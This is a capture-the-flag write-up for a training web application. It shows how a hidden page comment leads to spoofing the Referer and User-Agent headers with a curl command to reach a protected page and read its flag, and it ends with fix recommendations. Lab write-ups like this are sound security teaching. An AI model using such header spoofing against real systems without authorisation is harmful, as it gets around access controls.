## Step 1: Open the Website

Open the target application in your browser:

```
http://<target-ip>
```

Click the **Copyright sign** at the bottom of the page.

---

## Step 2: Inspect Page Source

Open the page source code and look for hidden comments.

You will find:

```html
<!--
You must come from : "https://www.nsa.gov/".
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

This indicates that:

* The server checks the **Referer** header
* The server checks the **User-Agent** header

---

## Step 3: Craft a Custom Request

Since browsers do not easily allow manual header modification, use `curl` to spoof the required headers.

Send a request with:

* Referer: `https://www.nsa.gov/`
* User-Agent: `ft_bornToSec`

```bash
curl --referer "https://www.nsa.gov/" \
--user-agent "ft_bornToSec" \
http://<target-ip>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f | grep flag
```

---

## Step 4: Get the Flag

The server accepts the spoofed headers and grants access to the protected page.

The flag is returned in the response.

## Fix Recommendations

* Never rely on Referer or User-Agent for security decisions
* Implement proper authentication and session validation
* Validate access server-side using secure tokens
* Log suspicious header manipulation attempts
